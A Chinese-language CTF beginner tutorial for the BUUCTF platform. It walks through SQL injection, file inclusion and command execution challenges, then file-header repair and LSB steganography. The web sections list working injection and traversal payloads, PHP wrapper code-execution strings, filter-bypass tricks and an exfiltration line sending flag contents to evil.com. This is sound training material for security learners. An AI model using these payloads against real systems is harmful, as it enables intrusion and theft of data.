## 一、BUUCTF平台介绍与登录

### 1.1 什么是BUUCTF？

```
【通俗易懂的解释】

BUUCTF就像是一个"真题博物馆"：
  - 收集了历年各大CTF比赛的真题
  - 题目质量高，难度梯度合理
  - 可以复现真实比赛场景
  - 是国内最受欢迎的CTF练习平台之一

为什么选择BUUCTF？
  - 题目来源于真实比赛，不是"人造题"
  - 题目难度贴近真实比赛水平
  - 有详细的题目分类和难度标注
  - 可以模拟真实比赛的时间压力

平台特点：
  - Web题目：涵盖SQL注入、文件包含、命令执行等
  - Misc题目：隐写术、流量分析、编码解码等
  - Pwn题目：栈溢出、格式化字符串等
  - Crypto题目：RSA、AES等密码学
  - Reverse题目：逆向破解
```

```
【如何选择合适的题目】

选择标准：
  1. 难度标注为"简单"
  2. 题目类型是自己学过的
  3. 题目有足够的解题人数（说明题目正常）
  4. 题目描述清晰

推荐题目类型：
  - SQL注入类（数字型、字符型）
  - 文件包含类（LFI）
  - 命令执行类（RCE）
  - HTTP协议类（Cookie、UA、Referer）
  - XSS类（简单反射型）

避免题目类型：
  - 反序列化（难度较高）
  - SSRF（难度较高）
  - SSTI（难度较高）
  - 综合漏洞（难度较高）

第一道题选择：
  建议：选择SQL注入类题目
  原因：SQL注入是Web核心，必须熟练
  目标：30分钟内完成
```

### 3.2 SQL注入题目解题流程

```
【SQL注入解题标准流程】

步骤1：判断注入点（5分钟）
  动作：
    1. 访问题目URL
    2. 观察页面结构
    3. 找到可能的注入点（如?id=1）
    4. 测试注入：
       ?id=1' → 看是否报错
       ?id=1 and 1=1 → 看是否正常
       ?id=1 and 1=2 → 看是否异常
  
  判断：
    如果报错 → 存在注入
    如果正常/异常有区别 → 存在注入

步骤2：判断闭合方式（5分钟）
  动作：
    测试不同的闭合方式：
    ?id=1' → 单引号闭合
    ?id=1" → 双引号闭合
    ?id=1) → 括号闭合
    ?id=1') → 单引号括号闭合
  
  判断：
    根据报错信息判断闭合方式

步骤3：判断列数（5分钟）
  动作：
    ?id=1 order by 1
    ?id=1 order by 2
    ?id=1 order by 3
    ...
    直到报错
  
  判断：
    报错前的数字就是列数

步骤4：联合查询（5分钟）
  动作：
    ?id=-1 union select 1,2,3,...n
    （n是列数）
  
  观察：
    看哪个位置有回显
    在回显位置查询数据

步骤5：查询数据（10分钟）
  动作：
    查库名：
    ?id=-1 union select 1,database(),3
    
    查表名：
    ?id=-1 union select 1,group_concat(table_name),3 
    FROM information_schema.tables 
    WHERE table_schema='库名'
    
    查字段名：
    ?id=-1 union select 1,group_concat(column_name),3 
    FROM information_schema.columns 
    WHERE table_name='表名'
    
    查数据：
    ?id=-1 union select 1,字段名,3 FROM 表名
```

## 四、Web简单题实战（第二道）

### 4.1 文件包含题目解题流程

```
【文件包含解题标准流程】

步骤1：识别文件包含点（5分钟）
  动作：
    1. 访问题目URL
    2. 观察URL参数
    3. 找到可能的文件包含参数（如?file=）
    4. 测试包含：
       ?file=../../../etc/passwd
       ?file=/etc/passwd
  
  判断：
    如果能读取passwd → 存在文件包含

步骤2：尝试伪协议（10分钟）
  动作：
    尝试各种伪协议：
    
    php://filter：
    ?file=php://filter/convert.base64-encode/resource=index.php
    → 解码Base64获取源码
    
    php://input：
    ?file=php://input
    POST: <?php system('ls');?>
    → 执行命令
    
    data://：
    ?file=data://text/plain,<?php system('cat /flag');?>
    → 执行代码
    
    file://：
    ?file=file:///flag
    → 读取文件

步骤3：绕过限制（10分钟）
  如果有过滤：
    ../被过滤：
      ?file=....//....//etc/passwd
      ?file=..%2f..%2fetc/passwd
    
    后缀被强制添加：
      ?file=../../../etc/passwd%00.jpg
      或使用伪协议
    
    关键字被过滤：
      编码绕过
      大小写绕过

步骤4：获取Flag（5分钟）
  动作：
    根据题目提示找到flag位置
    使用合适的伪协议读取
    解码获取flag
```

### 4.2 文件包含常见考点

```
【文件包含常见考点汇总】

考点1：简单LFI
  特点：直接包含，无过滤
  解法：?file=../../../etc/passwd
  或：?file=php://filter/...获取源码

考点2：后缀限制
  特点：代码会自动添加后缀
  解法：使用伪协议（不需要后缀）
  或：空字节截断（PHP<5.3.4）

考点3：路径限制
  特点：只能包含特定目录
  解法：使用../跳出目录

考点4：关键字过滤
  特点：过滤了../、php等关键字
  解法：编码绕过、双写绕过

考点5：日志包含
  特点：无法直接包含代码文件
  解法：
    1. 在User-Agent注入代码
    2. 包含日志文件
    3. 执行代码

考点6：Session包含
  特点：利用Session文件执行代码
  解法：
    1. 控制Session内容
    2. 包含Session文件
    3. 执行代码
```

## 五、Web简单题实战（第三道）

### 5.1 命令执行题目解题流程

```
【命令执行解题标准流程】

步骤1：识别命令执行点（5分钟）
  动作：
    1. 访问题目URL
    2. 观察URL参数
    3. 找到可能的命令执行参数（如?cmd=、?ip=）
    4. 测试执行：
       ?cmd=ls
       ?ip=127.0.0.1;ls
  
  判断：
    如果有输出 → 存在命令执行

步骤2：测试连接符（5分钟）
  动作：
    测试各种连接符：
    ; → 顺序执行
    | → 管道传递
    || → 失败才执行
    && → 成功才执行
  
  判断：
    根据输出判断哪种连接符可用

步骤3：查找Flag位置（5分钟）
  动作：
    ?cmd=ls /
    ?cmd=ls -la /
    ?cmd=find / -name flag
    ?cmd=find / -name "*flag*"
  
  观察：
    找到flag文件位置

步骤4：读取Flag（5分钟）
  动作：
    ?cmd=cat /flag
    ?cmd=cat /path/to/flag
    ?cmd=head /flag
    ?cmd=tail /flag

步骤5：绕过限制（10分钟）
  如果有过滤：
    空格被过滤：
      ?cmd=cat$IFS$9/flag
      ?cmd=cat${IFS}/flag
      ?cmd=cat%09/flag
    
    cat被过滤：
      ?cmd=ca''t /flag
      ?cmd=ca\t /flag
      ?cmd=head /flag
    
    flag被过滤：
      ?cmd=cat /fl*
      ?cmd=cat /fl?g
      ?cmd=cat /f[a-z]ag
```

### 5.2 命令执行常见考点

```
【命令执行常见考点汇总】

考点1：直接命令执行
  特点：直接执行用户输入的命令
  解法：?cmd=cat /flag

考点2：Ping命令注入
  特点：ping命令后可注入
  解法：?ip=127.0.0.1;cat /flag

考点3：过滤空格
  特点：空格被过滤
  解法：使用$IFS、%09等替代

考点4：过滤关键字
  特点：cat、flag等被过滤
  解法：使用''、\、变量拼接等绕过

考点5：无回显命令执行
  特点：命令执行但无输出
  解法：
    1. 写入文件：cat /flag > /var/www/html/1.txt
    2. 外带数据：curl http://evil.com/?d=$(cat /flag)

考点6：盲注命令执行
  特点：无法确认命令是否执行
  解法：
    1. 时间盲注：sleep 5
    2. 根据响应时间判断
```

### 6.2 文件头修复解题流程

```
【文件头修复解题标准流程】

步骤1：下载并观察文件（2分钟）
  动作：
    1. 下载题目文件
    2. 尝试打开文件
    3. 观察文件现象：
       - 无法打开？
       - 打开后乱码？
       - 显示为错误类型？

步骤2：用010 Editor分析（5分钟）
  动作：
    1. 用010 Editor打开文件
    2. 查看文件开头字节
    3. 对比正常文件头
  
  分析：
    PNG正常文件头：89 50 4E 47 0D 0A 1A 0A
    JPG正常文件头：FF D8 FF
    ZIP正常文件头：50 4B 03 04
    GIF正常文件头：47 49 46 38

步骤3：修复文件头（5分钟）
  动作：
    1. 根据题目提示判断文件类型
    2. 在010 Editor中修改文件头
    3. 保存文件
  
  操作：
    选中错误字节 → 输入正确字节 → 保存

步骤4：打开修复后的文件（3分钟）
  动作：
    1. 用对应程序打开修复后的文件
    2. 查看内容
    3. 寻找flag
  
  观察：
    flag可能在：
    - 图片内容中
    - 图片尾部追加数据
    - 图片EXIF信息
    - 图片隐藏内容
```

### 6.3 文件头修复常见考点

```
【文件头修复常见考点】

考点1：文件头被删除
  现象：文件开头全是00或乱码
  解法：添加正确的文件头

考点2：文件头被修改
  现象：文件头字节错误
  解法：修改为正确的文件头

考点3：文件类型伪装
  现象：扩展名与实际类型不符
  解法：根据文件头判断真实类型

考点4：文件头部分损坏
  现象：文件头部分字节错误
  解法：修复错误的字节

考点5：文件尾部追加数据
  现象：修复文件头后仍有隐藏数据
  解法：
    1. 用010 Editor查看文件尾部
    2. 搜索flag关键字
    3. 提取隐藏数据
```

### 7.2 LSB隐写原理详解

```
【通俗易懂的解释——LSB隐写原理】

什么是LSB？
  LSB = Least Significant Bit = 最低有效位
  
  想象一个颜色值：
    每个颜色值是8位，如：255 = 11111111
    最高位（MSB）是左边的1
    最低位（LSB）是右边的1
  
  LSB的作用：
    - 改变最高位 → 颜色变化很大（如255变成127）
    - 改变最低位 → 颜色变化很小（如255变成254）
    - 人眼几乎看不出区别！

LSB隐写的原理：
  - 把信息藏在每个像素的最低位
  - 图片外观不变
  - 但里面藏着秘密
  
  举例：
    原像素：R=255(11111111), G=255(11111111), B=255(11111111)
    隐藏信息：字母'A' = 01000001
    
    隐藏后：
    R最低位改为0 → 11111110 = 254
    G最低位改为1 → 11111111 = 255
    B最低位改为0 → 11111110 = 254
    ...
    
    人眼看不出区别，但信息已经藏进去了！

如何提取？
  - 提取每个像素的最低位
  - 组合起来就是隐藏的信息
  - 用StegSolve自动提取
```
